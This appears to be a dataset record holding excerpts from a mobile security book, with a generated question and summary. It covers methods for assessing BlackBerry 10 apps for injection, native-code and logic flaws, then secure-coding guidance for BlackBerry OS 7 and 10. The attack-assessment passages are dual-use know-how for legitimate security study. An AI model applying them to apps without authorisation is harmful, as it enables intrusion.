time\n(https://github.com/blackberry/Cascades-Samples/tree/master/invokeclient).\nWhen there isn't an invocation target for the functionality you want, then the next avenue to explore is writing\nyour own instrumentation harness (i.e., a binary wrapped that is able to load the library, supply data and\nmonitor for crashes, etc.) around the target libraries if they are external to the app. If the library is open source\n(you could code review) this will simply be a case of getting the headers. If the library is proprietary, you must\nrevert to reverse engineering to create your own headers so you can use the library.\nAfter you have the ability to invoke the functionality you want to fuzz, it is then a case of executing the harness\nwithin the simulator (which allows higher degrees of performance/parallelism) or the real device. The core files\nfor any issues appear in logs/*.core.\nWhen you assess for native code issues there are obviously native and Cascade apps; however, equally\nimportant are WebWorks apps, which use Cordova plug-ins. As discussed in Chapter 14 these plug-ins are native\ncode with a JavaScript bridge to a native function that are then callable from the app. The attack path will be\napp-dependent but might include assets downloaded over HTTP connections or an injection vulnerability that\nallows you to inject JavaScript. You're looking to obtain arbitrary code execution.\nInjection Vulnerability Classes\nApps that are potentially susceptible to injection vulnerabilities will primarily be Cascade and WebWorks based.\nIn both cases you need to identify a source of tainting that gets you into a position to influence the scripting\nengines.\nWhen considering injection vulnerabilities look for traditional JavaScript injection, DOM-based injection, and\nHTML or markup injection.\nAgain, entire books are written on this subject, but a common and quite effective way to identify such issues is\nto walk through the app identifying strings that appear to originate from external sources in the network, a local\nfile, or the IPC mechanisms. You then attempt to taint these strings either at the source or via interception and\nmodify them with common payloads to demonstrate vulnerability. A good reference for these strings is the\nOWASP Filter Evasion Cheat Sheet (https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).\nWithin Cascades apps things can get quite complex because you have the ability to expose C++ objects to QML\nand vice versa (http://developer\n.blackberry.com/native/documentation/cascades/dev/integrating_cpp_qml/). As a result understanding this\nfunctionality which is available and going beyond standard cross-site-scripting classes is important. As noted in\nthe QML security document, assessing all instances of the following is important:\nUses of import to ensure they don't import QML or JavaScript that could be intercepted or otherwise tainted\nby an attacker.\nUses of Loader to ensure they do not import QML or JavaScript that could be intercepted or otherwise\ntainted by an attacker.\nUses of XMLHttpRequest to ensure they do not load data that an attacker can control and then execute.\nNormally, you conduct assessments in these cases at a source level by extracting the BAR and inspecting the\nunderlying code.\nLogic Issues\nThe final primary class of vulnerability to consider is logic issues. These vulnerabilities are highly dependent on\nthe functionality of the app. This class of issue includes everything from the weird to the wonderful to the\ndownright crazy. To discover these issues you must have a good understanding of all facets of the app and all the\ntopics documented in Chapters 14, 15, 16, and 17.\nLogic issues really can be anything from the supporting of negative order amounts which result in the app giving\nyou money through to user interface spoofing and everything in between. As a result it is imperative to\nunderstand the function of the app, how the user will interact with it, likely implicit security boundaries, and\nhow any of these can be misused.\nSummary\nIn this chapter you looked at the common types of vulnerabilities to which BlackBerry 10 apps can be\nsusceptible and how to go about identifying whether an app is vulnerable. We've tried to provide specific\nguidance to common point issues, and in places provide guidance on the types of things to consider and how to\nassess for them.\nThis topic is almost limitless and as such potential vulnerabilities will be highly dependent on the app you are\ntrying to hack. Understanding the app, its core function, attack surface, development language, and the services\nit interacts with is important. This understanding allows you to develop representative attack threat models and\nthus accurate attack trees (conceptual diagrams showing how an asset, or target, might be attacked) to use\nagainst the app.",
    "question": "What are the key methods and considerations for identifying and validating vulnerabilities in BlackBerry 10 apps related to encrypted traffic modification, integrity checks, PII handling, and native code security?",
    "summary": "BlackBerry 10 apps can be vulnerable to encrypted traffic modification, integrity issues, and PII exposure. To check for these, you can validate encrypted data, ensure integrity checks like HMAC are used, and analyze how PII is handled through app permissions and IPC mechanisms. Additionally, developers should be aware of native code vulnerabilities, such as memory corruption, and logic issues that depend on the app's functionality. Assessing these aspects helps identify and mitigate potential security risks in BlackBerry 10 applications."
  },
  {
    "start": 97,
    "end": 102,
    "text": "CHAPTER 17\nWriting Secure BlackBerry Applications\nThe accepted wisdom made famous by initiatives such as Microsoft’s Security Development Lifecycle\n(https://www.microsoft.com/security/sdl/), SafeCode (http://www.safecode.org/), BSIMM\n(http://bsimm.com/), and similar is that in regard to software security an ounce of prevention is worth a pound\nof cure (if you work in imperial measurements still). In other words, if security is considered earlier in the\ndevelopment lifecycle you can significantly reduce the likelihood of finding issues late in the cycle, or worst-\ncase, after release. Although this approach should begin in the requirements and design stages, consideration\nduring development is equally important and thus this chapter.\nIn this chapter you look at how to write secure BlackBerry applications from a development perspective. To\ndevelop applications in a secure manner, understanding the features that you can implement is important from\nthe outset so that you take the corresponding security and API selection considerations into account during\ndevelopment.\nThis chapter first looks at how to secure BlackBerry OS Legacy applications before looking at BlackBerry 10\nnative, Cascade, and HTML and JavaScript applications. It does not cover BlackBerry 10 Adobe AIR–based apps\nbecause support for it is depreciated in 10.3.1.\nSecuring BlackBerry OS 7.x and Earlier Legacy Java Applications\nAs you write BlackBerry OS 7.x and earlier legacy (or BlackBerry classic) applications in Java (this section does\nnot consider packaged HTML5 and JavaScript), you do not need to consider certain classes of vulnerability such\nas memory corruption. However, you must consider an array of generic Java- and BlackBerry-specific issues.\nThis chapter covers all the common security features available to developers while giving examples about how\nto use them, as well as any associated caveats.\nGeneral Java Secure Development Principals\nBefore addressing the BlackBerry OS 7.x–specific API considerations, it’s worth reading through the general\nprincipals outlined in the CERT Oracle Secure Coding Standard for Java\n(https://www.securecoding.cert.org/confluence/display/java/The+CERT+Oracle+Secure+Coding+Standard+for+Java\nAlthough not all of them are relevant, a number of generic areas do apply, namely:\nSubset of Input Validation and Data Sanitization (IDS)\nSubset of Numeric Types and Operations (NUM)\nSubset of Object Orientation (OBJ)\nSubset of Methods (MET)\nSubset of Miscellaneous (MSC)\nAfter you have reviewed these sections you’re ready to understand the BlackBerry OS 7.x Java-specific practices.\nMaking Apps Work with the Application Control Policies\nBlackBerry has a powerful control framework known as Application Control Policies\n(http://www.blackberry.com/newsletters/connection/it/i610/control_policies.shtml). These policies allow\na rich set of controls to be placed around applications at either the BES (BlackBerry Enterprise Server)\nadministrator’s or user’s behest. These areas include certain API access such as:\nWhat happens when you insert your smartphone in a holster?\nIs access to the Browser Filters API allowed?\nIs access to the Email API allowed?\nIs access to the Event Injection API allowed?\nIs access to the File API allowed?\nIs access to the GPS API allowed?\nIs access to the Handheld Key Store allowed?\nIs access to the Interprocess Communication API allowed?\nIs access to the Phone API allowed?\nIs access to the Media API allowed?\nIs access to the Module Management API allowed?\nIs access to the PIM API allowed?\nIs access to the Screen, Microphone, and Video Capturing APIs allowed?\nIs access to the Serial Port Profile for Bluetooth API allowed?\nIs access to the User Authenticator API allowed?\nIs access to the Wi-Fi API allowed?\nAs a result, developers wanting to write robust security-conscious applications should not automatically assume\nthat their app will be granted access to all the APIs it requires. Instead the recommendation is that you use\ntry/catch exception-handling extensively around APIs to which access can be controlled, especially if\nfunctionality in the app degrades gracefully if access is not granted.\nBy taking this defensive access control–aware approach to development you can ensure your application will\ncontinue to provide the user experience your users expect. If you don’t, a chance exists that when used in more\nrisk-aware organizations or when configured by more risk-adverse users that your application will simply\ngenerate an unhandled exception and crash.\nMemory Cleaning\nIn BlackBerry OS the possibility exists to have memory (RAM) cleaned of sensitive information in certain high-\nsecurity situations such as during certain operations or after a period of time\n(http://docs.blackberry.com/en/smartphone_users/deliverables/36022/About_memory_cleaning_61_1587246_11.jsp\nThis memory cleaning can be extremely useful if you want to guard against sophisticated threat actors and\nensure that sensitive cleartext information of cryptographic key material does not persist when the device is not\nin active use.\nTo understand how to react to a memory cleaning event in your application you first need to understand when\nthey typically occur:\nWhen you insert your smartphone in a holster\nWhen you do not use your smartphone for a specified period of time\nWhen you synchronize with your computer\nWhen you change the time or the time zone for your smartphone\nWhen you lock your smartphone\nThe memory-cleaning feature is typically either configured by the organization’s administration through a BES\nmanagement policy or alternatively by the user\n(http://docs.blackberry.com/en/smartphone_users/deliverables/\n36022/Turn_on_memory_cleaning_61_1720942_11.jsp). It is also important to remember that by default these\nmemory cleaning callbacks will not be called if the system is not configured. If you want to ensure sensitive\nmemory is cleaned, then you’ll have to implement your own event-driven or inactivity- driven solution.\nIf you want to support memory cleaning in your app using the OS support method then you need to implement\na listener using (http://www.blackberry\n.com/developers/docs/7.0.0api/net/rim/device/api/memorycleaner/MemoryCleanerDaemon.html):\nnet.rim.device.api.memorycleaner.MemoryCleanerDaemon\nSpecifically, you need to implement a listener via one of the following methods,\naddListener(MemoryCleanerListener listener)\nor:\naddListener(MemoryCleanerListener listener, boolean enable)\nWhen invoking either of these methods you pass an implementation of the interface MemoryCleanerListener\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/memorycleaner/MemoryCleanerListener\n.html) to them. By calling these methods you start the memory-cleaning daemon if it is not already started upon\ninvocation. Then within your interface implementation your responsibility is to securely erase any sensitive\ninformation. The best strategies are to\nUse zero sensitive information in the actual variable or object, being careful to not work on copies.\nUse the LowMemoryManager class and specifically the markAsRecoverable method to prioritize recovery by the\nJava Virtual Machine garbage collection\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/lowmemory/LowMemoryManager.html\nA final note with regard to memory cleaning is that you may want to build some form of malicious activity\ndetection within your application and then invoke a memory clean programmatically via the previous registered\nlisteners. If that is the case then you can do so by invoking net.rim.device.api\n.memorycleaner.MemoryCleanerDaemon.cleanAll(), which causes the process to begin.\nControlling File Access and Encryption\nBlackBerry file storage is broken down conceptually into two stores\n(http://docs.blackberry.com/en/developers/deliverables/17952/Storing_files_in_the_file_system_1219757_11.jsp\nInternal device storage, such as those residing under file:///store/\nExternal device storage, such as those residing under file:///SDCard\nFile access control and encryption on a BlackBerry device can typically occur via a number of possible routes:\nBES or user-configured policy\n(http://docs.blackberry.com/en/smartphone_users/deliverables/36023/Turn_on_encryption_61_1571288_11\n.jsp) is encrypted using one of three combinations: device key, device password, or device key and device\npassword. In this configuration you don’t need to do anything and your application will automatically benefit\nfrom the device’s security settings.\nEncrypted due to the use of controlled access. BlackBerry notes a caveat with this feature saying the\nencryption key will be written to the root of the storage device that the encrypted file is on—that is,\nremovable SD storage—and that it does not apply to the internal storage (http://www\n.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/io/file/ExtendedFileConnection.html).\nEncrypted due to the use of DRM forward locking, thus encrypting the device and locking it to the device in\nquestion.\nMost developers will not want to override the user’s preferences in regard to the encryption of files. However, if\nyou do want to implement controlled access then take the caveat noted in the previous list into consideration\nwith regard to where the key still exists in the case of capable threat actors and the fact it won’t apply to internal\nstorage. By far the most secure method is the use of DRM forward locking; however, carefully consider the\nimpact on user experience. Your users won’t be able to move files between devices.\nThe following methods enable developers to have control over file encryption methods:\nControlled access—Achieved by calling the setControlledAccess method to set the code signing key to\nyours in the net.rim.device.api.io.file .ExtendedFileConnection interface.\nDRM forward locking—Achieved by calling the enableDRMForwardLock() method in the\nnet.rim.device.api.io.file.ExtendedFileConnection interface by casting the Connector object from\njavax.microedition.io.Connector.open\n(http://www.blackberry.com/developers/docs/7.0.0api/javax/microedition/io/Connector.html).\nBefore deploying access control and/or file encryption, note that there can be, albeit minimal on modern\ndevices, a performance impact. Also obviously with any extra processing over and above the base OS and\ndepending on usage, there could potentially be a battery life impact. As a result, a suggestion is that you\nmeasure performance when enabling access control or encryption to understand these impacts.\nSQLite Database Encryption\nBlackBerry has native support within its Java API since 5.x for SQLite databases. These databases can be created\nin memory or on persistent storage. Persistent storage may be physical internal to the device or a removable SD\ncard. For these persistent SQLite databases a number of possible security options can be specified by\nDatabaseSecurityOptions\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/database/DatabaseSecurityOptions\n.html):\nThe following list covers the BlackBerry OS database security options:\nNot encrypted and accessible from any application (insecure).\nEncrypted and accessible from any application but only on this device.\nEncrypted and accessible only from applications that are signed with the code-signing key that created the\ndatabase but only on this device (secure).\nThe DatabaseSecurityOptions are passed either at the point of creation or at the point of encryption using one\nof the methods in the DatabaseFactory class\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/database/DatabaseFactory.html):\ncreate(String id, DatabaseSecurityOptions securityOptions)\ncreate(String id, DatabaseSecurityOptions securityOptions,\nDatabaseOptions\ndatabaseOptions)\ncreate(URI fileURI, DatabaseSecurityOptions securityOptions)\ncreate(URI fileURI, DatabaseSecurityOptions securityOptions,\nDatabaseOptions databaseOptions)\nYou can also encrypt and decrypt existing databases on an as-needed basis through the clearly named functions\nin the DatabaseFactory class.\nIf you intend to access these SQLite databases over USB while the device is mounted in mass storage mode, say,\nvia a companion application on a PC, you may not be able to utilize database encryption and thus access control\n—that is, unless you implement your own IPC mechanism between the device-based app and the PC application\nusing the USB port API (net.rim.device.api .system.USBPort).\nPersistent Store Access Control and Encryption\nThe persistent store on a BlackBerry is an internal storage mechanism and format used for storing Java objects\nthat are not directly accessible as traditional files via any means. BlackBerry describes it as follows:\nThe persistent store provides a means for objects to persist across device resets. A persistent object consists\nof a key-value pair. When a persistent object is committed to the persistent store, that object’s value is stored\nin flash memory via a deep copy. The value can then be retrieved at a later point in time via the key.\nhttp://www.blackberry.com/developers/docs/ 7.0.0api/net/rim/device/api/system/\nPersistentStore.html\nThis feature comes with two notable optional security features:\nAccess control (controlled access in BlackBerry vernacular) via net.rim\n.system.device.api.system.ControlledAccess (http://www.blackberry\n.com/developers/docs/7.0.0api/net/rim/device/api/system/ControlledAccess.html).\nEncryption (content protection in BlackBerry vernacular) via net\n.rim.device.api.system.PersistentContent (http://www.blackberry\n.com/developers/docs/6.0.0api/net/rim/device/api/system/PersistentContent.html).\nContent protection–provided encryption will only be enabled for an application if the following conditions are\nmet: (http://developer.blackberry .com/bbos/java/documentation/content_protection_intro_1981828_11\n.html):\nThe device has a password set.\nA BES or user-configured policy has been applied enabling it.\nThe app subscribes and uses the content protection framework.\nAs with file encryption discussed earlier in this chapter, developers will unlikely want to override the user’s\npreferences in regard to data at rest. This should be especially true in the case of the persistent store because no\nalternate way exists to access its contents. However, the use of ControlledAccess should be considered. Without\nit a threat actor who can reverse-engineer your app can extract the ‘key’ (not be confused with an encryption\nkey) and then simply use PersistentStore.getPersistentObject(key) to obtain access and thus read or write\nany contents.\nRuntime Store Access Control\nThe runtime store on a BlackBerry is an internal storage mechanism and format used for storing Java objects\nthat are not directly accessible as traditional files via any means yet are not persistent. BlackBerry describes it as\nfollows:\nProvides a central location for applications to share information.\nThe store is not persistent. If the device resets, then information stored in the store is lost.\nhttp://www.blackberry.com/developers/docs/7.0.0api/ net/rim/device/api/system/RuntimeStore.html\nUnlike with the persistent store no need should exist to encrypt the contents of the runtime store. However, as\nwith the persistent control, a ControlledAccess you should use wrapper\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/system/ControlledAccess.html).\nRandomness Sources\nThe BlackBerry API provides two primary randomness APIs, one of which is better quality than the other. These\nrandomness APIs are\njava.util.Random (http://www.blackberry.com/developers/docs/7.0.0api/java/util/Random.html)\nnet.rim.device.api.crypto.RandomSource\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/crypto/RandomSource .html)\nThe second of these two is the one you should use if you require a cryptographically strong randomness source\nand don’t have a specific preference for an algorithm.\nOn the other hand if you do have a specific pseudo-random algorithm that you prefer then there is the\nnet.rim.device.api.crypto.PseudoRandomSource interface that the following classes implement (note all under\nthe net.rim .device.api.crypto namespace):\nAESCTRDRBGPseudoRandomSource—Implements a deterministic random bit generator (DRBG) using an\napproved AES block cipher algorithm in counter mode. This DRBG uses a 128-bit security strength.\nARC4PseudoRandomSource—Implements a pseudo-random number generator (PRNG) that uses the Alleged\nRC4 (ARC4) algorithm to expand a finite length seed into an arbitrarily long stream of pseudo-random bytes.\nBlackBerry implemented ARC4 as described in “Applied Cryptography,” by Bruce Schneier, in Section 17.1\n(published 1996).\nCTRPseudoRandomSource—Implements a symmetric key block cipher in Counter mode to provide a sequence\nof pseudo-random bytes. CTR mode is defined in FIPS SP 800-38A.\nFIPS186PseudoRandomSource—Implements the pseudo-random number generator as found in FIPS 186-2.\nOFBPseudoRandomSource—Uses a symmetric key block cipher in Output Feedback mode to provide a sequence\nof pseudo-random bytes. OFB mode is defined in FIPS 81.\nP1363KDF1PseudoRandomSource—Implements the key derivation function 1 (KDF1) found in the main section\nof P1363. The version BlackBerry implemented is from the draft 13 (“d13”) P1363 document.\nPKCS1MGF1PseudoRandomSource—Implements the PKCS1 mask generation function (MGF1), using a digest to\nexpand a finite length seed into an arbitrarily long stream of pseudo-random bytes.\nPKCS5KDF1PseudoRandomSource—Not recommended for use!\nPKCS5KDF2PseudoRandomSource—Implements PKCS #5 key derivation function (KDF) 2 pseudo-random\nnumber generation. BlackBerry implemented the PKCS5 KDF2 as per PKCS #5 version 2.0 (March 1999).\nRFC2631KDFPseudoRandomSource—Implements the KDF found in RFC 2631, which is based upon the KDF in\nX9.42.\nSPKMKDFPseudoRandomSource—Implements the KDF found in RFC 2025 but comes with caveats on the ability\nto call multiple times.\nX942KDFPseudoRandomSource—Implements the KDF found in ANSI X9.42.\nX963KDFPseudoRandomSource—Implements the KDF found in ANSI X9.63.\nUnless you have a specific requirement for any of these algorithms, net\n.rim.device.api.crypto.PseudoRandomSource should suffice for your day-to-day use.\nSSL, TLS Certificate, and Public Key Pinning in OS 7x and Earlier Legacy Java\nApplications\nTo mitigate rogue or compromised certificate authorities or intermediaries issuing forged SSL or TLS certificates\nfor a domain/service that chain up and thus validate correctly, you may want to perform certificate or public key\npinning. If you’re not familiar with the topic, look for the excellent write-up on the OWASP site on the attack\nand the defense concepts (https://www.owasp.org/index .php/Certificate_and_Public_Key_Pinning).\nOn BlackBerry, a certificate object (http://www.blackberry.com/developers/\ndocs/7.0.0api/javax/microedition/pki/Certificate.html) for a TLS connection is retrieved by calling\nnet.rim.device.api.crypto.tls .tls10.TLS10Connection.getSecurityInfo() (http://www.blackberry\n.com/developers/docs/7.0.0api/net/rim/device/api/crypto/tls/tls10/TLS10Connection.html#getSecurityInfo()\nand this returns a J2ME-specified SecurityInfo\n(http://www.blackberry.com/developers/docs/7.0.0api/javax/microedition/io/SecurityInfo.html) object\nthat exposes the getServerCertificate() method. The certificate object is the J2ME-defined type and not the\nX.509 BlackBerry-defined type (http://www.blackberry\n.com/developers/docs/7.0.0api/net/rim/device/api/crypto/certificate/x509/X509Certificate.html), the\nimpact of which is described shortly. The J2ME incarnation of a certificate exposes the following Distinguished\nName (DN) attributes for X.509 server certificates:\nCommon name\nSurname\nCountry name\nLocality name\nState/province name\nStreet address\nOrganization name\nOrganization business unit\nE-mail address\nIn addition the following methods of use are exposed and provide further information:\ngetIssuer()\ngetSerialNumber()\ngetVersion()\nHowever, no method is exposed that will provide the server certificate’s Subject Public Key Information\n(although this information is annoyingly present in the BlackBerry X.509 incarnation). As a result your ability\nto pin anything strong is somewhat limited and could potentially be subverted if a threat actor has control of an\nintermediary certificate authority signing certificate.\nTo do certificate/public key pinning on BlackBerry OS properly, you need to use the Legion of the Bouncy Castle\n(https://www.bouncycastle.org) implementation of TLS, which exposes all the required elements. You can see\na good example of how to use Bouncy Castle to get the X509 certificate information for a particular connection\nin the article by Bored Wookie entitled, “How to Use Bouncy Castle Lightweight API’s TLSClient”\n(http://boredwookie.net/index .php/blog/how-to-use-bouncy-castle-lightweight-api-s-tlsclient/). In the\nexample provided in the article, instead of calling the getEncoded() method you would call the\ngetSubjectPublicKeyInfo() method from the Bouncy Castle API\n(https://www.bouncycastle.org/docs/pkixdocs1.5on/org/bouncycastle/cert/X509CertificateHolder.html).\nYou are then able to retrieve the required Subject Public Key Information and thus pin your application to it.\nFinally, before embarking on certificate pinning, recognizing the potential operational overhead is important.\nFor example, in the most tightly coupled deployed app, each time the certificate is updated on the server the app\nwill need to be updated. This can be extremely difficult and, given general user upgrade apathy, causes all\nmanner of service or support issues. So although we have seen situations where certificate pinning has\nsuccessfully mitigated attacks against the most sophisticated threat actors, unless you are a major service\nprovider, government-orientated service, or financial institution, it is unlikely the additional overhead is\nproportionate to the risk you face.\nDefending Against Module Squatting\nThere exists a theoretical attack on BlackBerry where someone “squats” on the name that your app will retrieve\na handle from via CodeModuleManager .getModuleHandle()\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/system/CodeModuleManager.html#getModuleHandle()\nat a later point. The same attack is also possible when using CodeModuleManager .getModuleHandleForClass().\nHowever, this attack is a little more unlikely if the class is packaged by default with your app; however, if it isn’t\nand is an optional installation, then the same risk applies.\nYou might be using modules in a dynamic manner similar to this in the case of certificate pinning. If so, you\nmight choose to deploy the public key to the server in its own module to allow modular updating.\nAs a result if you are using either of these methods to dynamically load modules you produce, verify the signing\nkey of the module before use. You can do this verification using the\nControlledAccess.verifyCodeModuleSignature method\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/system/ControlledAccess.html#verifyCodeModuleSignature\n(int, net.rim.device.api.system.CodeSigningKey)). This type of misuse of modules has been seen in public in\nthe past by the firmware modding community. They used to rely on the ability to mismatch versions or replace\nmodules entirely. As a result, robust checking around of all of these areas can be prudent using the methods\nexposed by CodeModuleManager\n(http://www.blackberry.com/developers/docs/7.0.0api/net/rim/device/api/system/CodeModuleManager.html),\nincluding timestamps, versions, vendors, and so on.\nObfuscation\nAlthough it’s not strictly security related, if you have lots of sensitive intellectual property embedded in your\napplication then due to the use of Java you may want to complicate the disassembly and thus recovery of it.\nAlthough obfuscation won’t stop determined or skilled individuals, it can stop the casual tinkering. You can use\na variety of code/class obfuscators to protect BlackBerry Java applications.\nBlackBerry WebWorks Security on BlackBerry OS 7 or Lower\nBlackBerry WebWorks is best described by BlackBerry itself:\nProvides a central location for applications to share information.\nWhen you hear the words BlackBerry WebWorks, think HTML5, JavaScript, and CSS. Essentially, a\nBlackBerry WebWorks application is a web application that runs on a BlackBerry smartphone or BlackBerry\nPlayBook tablet.\nhttp://developer.blackberry.com/bbos/html5/documentation/ what_is_a_webworks_app_1845471_11.html\nWe don’t cover how to secure WebWorks applications on BlackBerry 7 other than to say two things.\nThe first is that BlackBerry produced a guide with what you need to know in a knowledge base whitepaper titled,\n“How to secure your BlackBerry WebWorks Application”\n(http://supportforums.blackberry.com/rim/attachments/rim/browser_dev@tkb/52/2/BlackBerry%20WebWorks%20Tutorial_%20How-\nto-secure-your-BlackBerry-WebWorks%20application.pdf). It covers the permissions model of allowing you to\nexpose nonweb-orientated API namespaces to JavaScript.\nThe second is that obviously where you are bridging web content with something like JavaScript and HTML, the\nrisk exists of cross-site script and content injection or modification using man-in-the-middle attacks. As a result\nyou need to be extremely careful about which namespaces you allow to be callable from your BlackBerry\nWebWorks application.\nSecuring BlackBerry 10 Native Applications\nBlackBerry 10 native applications are POSIX-compatible applications written in C or C++ running under the\nQNX microkernel, and as such, potentially suffer from a class of vulnerabilities commonly referred to as\nmemory corruption. Give special attention to defensive coding and to leveraging the available platform defenses\nin addition to any logic security considerations. In this section you look at how to write applications in a secure\nmanner.\nBlackBerry does provide a number of base considerations for BlackBerry 10 native applications that primarily\ncover some C language primitives such as structures, enums, and macros\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.native_sdk.security/topic/security_overview.html\nThe exception is compiler and linker defenses, which we also discuss in this section.\nGeneral C/C++ Secure Development Principals\nBefore we address the BlackBerry OS 10.x–specific API and platform considerations, reading through the\ngeneral principals outlined in the CERT C Coding Standard\n(https://www.securecoding.cert.org/confluence/display/seccode/CERT+C+Coding+Standard) and the\nunderdevelopment CERT C++ Secure Coding Standard\n(https://www.securecoding.cert.org/confluence/pages/viewpage .action?pageId=637) is worth your time. If\nterms such as stack overflow, heap overflow, integer wrap, format string, race condition, uninitialized\nmemory, and similar are all alien to you, then these readings are strongly recommended.\nAfter you have reviewed these references you’re ready for the BlackBerry OS 10.x–specific isms.\nCompiler and Linker Defenses\nBlackBerry 10 native applications are standard ELF format binaries compiled with GCC, which are loaded via a\nloader as on Linux and BSD and so on. A number of compiler and linker defenses should be used to maximize\nthe use of platform-provided, defense-in-depth security features. BlackBerry provides an overview of these\nfeatures in their development documentation (http://developer\n.blackberry.com/native/documentation/core/com.qnx.doc.native_sdk\n.security/topic/using_compiler_linker_defenses.html#dho1384790657335). In the spirit of full disclosure, this\nguide was in part written by the author while at BlackBerry in 2011.\nHere is a summary of these compiler and linker defenses and their high-level process:\nStack Cookies—Protect against stack-based overflows.\nRelocations Read Only—Protects against overwrites of the relocation section, which contains, among\nother things, function pointers.\nBind Now—Loads all library dependencies at load time and resolves them allowing the Global Offset Table\n(GOT) to be set to read-only and thus protect against direct overwriting.\nPosition Independent Code/Executables—Allows libraries and program executables to benefit from\naddress space layout randomization by not assuming it will load at a particular memory address.\nSource Fortification—Provides compiler time–added source fortification to protect against certain\nmemory corruption vulnerabilities.\nFormat String Warnings as Errors—Stops the compilation process with an error if a dangerous printf\nfamily function is observed.\nUsing all of these defenses in every native application is recommended. Although certain options such as\nRelocations, Read Only, and Bind Now will incur a load time performance impact, the defense in depth they\ncontribute is in most cases worth the tradeoff.\nRemember that the use of these options, with the exception of the last two, do not stop vulnerabilities from\nbeing present in the code. Instead they frustrate the exploitation of memory corruption vulnerabilities. An\nunsuccessfully exploited memory corruption vulnerability, while not yielding a compromise, may result in your\napplication crashing and lead to a denial of service, requiring the user to restart.\nMemory Cleaning\nIn regard to memory cleaning on BlackBerry 10, the only important thing to keep in mind is the default heap\ndoes not zero freed memory by default. As a result if you are a developer working with sensitive data then it is\nlikely best to explicitly zero the memory using memset and verify that it was been zeroed correctly to ensure\ncompiler optimizations do not override the intended functionality. For this reason, avoiding the use of functions\nsuch as realloc (http://www.qnx\n.com/developers/docs/660/topic/com.qnx.doc.neutrino.lib_ref/topic/r/realloc.html), which may in\ncertain circumstances free memory and provide a fresh pointer without the old memory being zeroed, is also\nadvisable.\nTaking the same cautious approach when dealing with local and global stack variables and C++ objects in the\nmost sensitive situations is likely also wise. Where the stack is being used for sensitive information again you\nshould explicitly memset the contents prior to return from the function and verifying that it is indeed zeroed via\nmemcmp. This memcmp will also help stop the memset being optimized out by the compiler.\nFile Access Control\nThe key question to answer when developing BlackBerry 10 native applications in regard to data storage is\nwhether the files that your app will create need to be accessible to other apps on a permanent basis, on an\ninvocation basis, or not at all (http://developer.blackberry.com/native/documentation/core/com\n.qnx.doc.native_sdk.devguide/topic/accessible_folders.html).\nIf your app’s files don’t need to be accessible to other applications on a permanent basis you should default to\nthe application’s private data or temporary directories as appropriate. By doing so you ensure your application’s\ndata is accessible to only it and not to other apps on the device, thus providing protection from information\ndisclosure and manipulation. You can obtain the location of the app’s data directory by calling the\nhomePath()API. Likewise you can obtain the location of the app’s temporary directory by calling the\ntempPath()API.\nIf your app’s files will be shared on an as-needed basis using the Invocation Framework\n(http://developer.blackberry.com/native/documentation/core/invocation_framework.html) then you can\nbenefit from its secure file transfer mechanism. You can use the Invocation Framework’s file transfer feature\n(http://developer.blackberry.com/native/documentation/cascades/device_platform/invocation/data_transfer.html\nto privately transfer files on an as-needed basis whereas general storage will be within the app’s private data\ndirectly.\nBlackBerry provides a good overview of the invocation framework and its purpose.\nWhen the framework receives an invocation request with a file:// URI, it inspects the URI to determine\nwhether the request refers to a shared area. If the file is already shared, the invocation request passes the\nURI to the file in the shared area, as specified by the sender. However, if the Invocation Framework detects\nthat the file is not shared, then by default it creates a read/write copy of the file in a private inbox for the\ntarget application. The client application can specify the file transfer mode attribute to override this behavior.\nhttp://www.blackberry.com/developers/docs/7.0.0api/ net/rim/device/api/system/RuntimeStore.html\nWhen you use this feature the file doesn’t have to be read/write; instead it can be read only. When files are\nshared using this mechanism, they actually end up residing under the Sandbox/<app name>/sharewith directory.\nIf your application needs to create files that will be shared with other apps on a permanent basis, you will need\nthe access_shared permission in your application bar-descriptor.xml file\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.native_sdk.devguide/topic/c_appfund_accessing_restricted_functionality.html\nHowever this should be used with caution as this is the most insecure way of storing files due to the frequency\nwith which apps are given access to shared files.\nFile Encryption\nData encryption in BlackBerry 10 is transparent, so unlike with BlackBerry OS 7.x legacy apps, developers need\nto do nothing to protect their data at rest if the user or the administrator enables it\n(http://docs.blackberry.com/en/admin/deliverables/63505/BES10_v10.2.2_BDS_Security_Technical_Overview_en.pdf\nImplementing your own encryption is left as an exercise for the reader. For key material, however, we\nrecommend using a password-based key derivation function such as PBKDF2 with a high iteration count (in the\ntens of thousands) and then a strong cipher and mode such as XTS-AES.\nRandomness Sources\nOn BlackBerry 10 there are two possible sources of randomness. The traditional POSIX sources such as rand()\nand srand() and the Security Builder API functions\n(http://developer.blackberry.com/native/reference/core/com\n.qnx.doc.crypto.lib_ref/topic/manual/about_rng_and_seeding.html). The Security Builder APIs stem from\nthe Certicom acquisition.\nBlackBerry provides a documented Security Builder example that is ANSI and FIPS compliant for Random\nNumber Generator (RNGs) (http://developer\n.blackberry.com/native/reference/core/com.qnx.doc.crypto.lib_ref/topic/manual/about_rng_and_seeding.html\nand shows how to correctly initialize the RNG.\nWhen you need a strong RNG, use the FIPS-compliant RNG.\nSSL, TLS Certificate, and Public Key Pinning in Blackberry 10 Native Applications\nBecause BlackBerry 10.x uses OpenSSL for its SSL/TLS transport implementation you can use the readily\navailable examples. In this case we recommend looking at the OWASP implementation\n(https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning). It provides a heavily commented\nexample of SSL/TLS public key pinning, which is trivial to integrate. However, ensuring that the public key file\nyou are using is not stored in the shared directory is important because this might be updatable by other third-\nparty applications. As discussed earlier in the “File Access Control” discussion, in this subsection use the\nhomePath()API to retrieve the path of the app’s private data directory and load it from there.\nSecurity Builder Encryption API\nThe Security Builder Encryption API\n(http://developer.blackberry.com/native/documentation/core/com.qnx.doc.crypto/topic/c_sb_ug_overview\n.html) is provided by the base BlackBerry platform. Suffice it to say, using this API for your cryptographic\nrequirements is the recommended approach and will not be covered here due to the wealth of documentation.\nHeap 